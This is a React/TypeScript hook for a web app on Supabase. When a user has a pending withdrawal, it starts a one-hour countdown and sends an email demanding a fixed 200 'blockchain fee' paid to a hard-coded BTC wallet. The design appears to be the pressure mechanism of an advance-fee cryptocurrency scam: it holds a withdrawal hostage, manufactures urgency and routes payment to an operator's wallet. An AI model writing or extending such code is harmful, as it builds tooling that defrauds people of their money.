import { useState, useEffect, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import { CONFIRMATION_FEE_WALLET_BTC } from "@/lib/constants";

const COUNTDOWN_HOURS = 1;
const STORAGE_KEY = "blockchain_fee_countdown_start";
const EMAIL_SENT_KEY = "blockchain_fee_email_sent";
const BLOCKCHAIN_FEE_AMOUNT = 200;

interface UseBlockchainFeeCountdownReturn {
  timeLeft: number;
  hasPendingWithdrawal: boolean;
  isExpired: boolean;
  withdrawalAmount: number;
  emailSent: boolean;
  sendingEmail: boolean;
  formatTime: (seconds: number) => string;
  resetCountdown: () => void;
  sendEmailNotification: () => Promise<boolean>;
}

export const useBlockchainFeeCountdown = (): UseBlockchainFeeCountdownReturn => {
  const [timeLeft, setTimeLeft] = useState(COUNTDOWN_HOURS * 60 * 60);
  const [hasPendingWithdrawal, setHasPendingWithdrawal] = useState(false);
  const [isExpired, setIsExpired] = useState(false);
  const [withdrawalAmount, setWithdrawalAmount] = useState(0);
  const [emailSent, setEmailSent] = useState(false);
  const [sendingEmail, setSendingEmail] = useState(false);

  const formatTime = useCallback((seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, "0")}:${minutes
      .toString()
      .padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  }, []);

  const resetCountdown = useCallback(() => {
    localStorage.removeItem(STORAGE_KEY);
    localStorage.removeItem(EMAIL_SENT_KEY);
    setTimeLeft(COUNTDOWN_HOURS * 60 * 60);
    setIsExpired(false);
    setEmailSent(false);
  }, []);

  const sendEmailNotification = useCallback(async (): Promise<boolean> => {
    if (emailSent || sendingEmail) return false;
    
    setSendingEmail(true);
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) {
        setSendingEmail(false);
        return false;
      }

      const hoursRemaining = Math.ceil(timeLeft / 3600);

      const { data, error } = await supabase.functions.invoke("send-blockchain-fee-notification", {
        body: {
          userId: user.id,
          withdrawalAmount,
          feeAmount: BLOCKCHAIN_FEE_AMOUNT,
          walletAddress: CONFIRMATION_FEE_WALLET_BTC,
          hoursRemaining,
        },
      });

      if (error) {
        console.error("Error sending email:", error);
        setSendingEmail(false);
        return false;
      }

      localStorage.setItem(EMAIL_SENT_KEY, "true");
      setEmailSent(true);
      setSendingEmail(false);
      return true;
    } catch (error) {
      console.error("Error sending email notification:", error);
      setSendingEmail(false);
      return false;
    }
  }, [emailSent, sendingEmail, timeLeft, withdrawalAmount]);

  useEffect(() => {
    // Check if email was already sent
    const sentStatus = localStorage.getItem(EMAIL_SENT_KEY);
    if (sentStatus === "true") {
      setEmailSent(true);
    }

    const checkPendingWithdrawals = async () => {
      try {
        const { data: { user } } = await supabase.auth.getUser();
        if (!user) return;

        const { data: pendingWithdrawals, error } = await supabase
          .from("transactions")
          .select("id, created_at, amount")
          .eq("user_id", user.id)
          .eq("type", "withdrawal")
          .eq("status", "pending")
          .order("created_at", { ascending: false })
          .limit(1);

        if (error) {
          console.error("Error checking withdrawals:", error);
          return;
        }

        if (pendingWithdrawals && pendingWithdrawals.length > 0) {
          setHasPendingWithdrawal(true);
          setWithdrawalAmount(pendingWithdrawals[0].amount);
          
          // Get or set countdown start time
          let startTime = localStorage.getItem(STORAGE_KEY);
          if (!startTime) {
            startTime = Date.now().toString();
            localStorage.setItem(STORAGE_KEY, startTime);
          }
          
          const elapsed = Math.floor((Date.now() - parseInt(startTime)) / 1000);
          const remaining = Math.max(0, COUNTDOWN_HOURS * 60 * 60 - elapsed);
          setTimeLeft(remaining);
          
          if (remaining === 0) {
            setIsExpired(true);
          }
        } else {
          // No pending withdrawal, reset
          localStorage.removeItem(STORAGE_KEY);
          localStorage.removeItem(EMAIL_SENT_KEY);
          setHasPendingWithdrawal(false);
          setEmailSent(false);
        }
      } catch (error) {
        console.error("Error:", error);
      }
    };

    checkPendingWithdrawals();
  }, []);

  useEffect(() => {
    if (!hasPendingWithdrawal || isExpired) return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setIsExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [hasPendingWithdrawal, isExpired]);

  return {
    timeLeft,
    hasPendingWithdrawal,
    isExpired,
    withdrawalAmount,
    emailSent,
    sendingEmail,
    formatTime,
    resetCountdown,
    sendEmailNotification,
  };
};
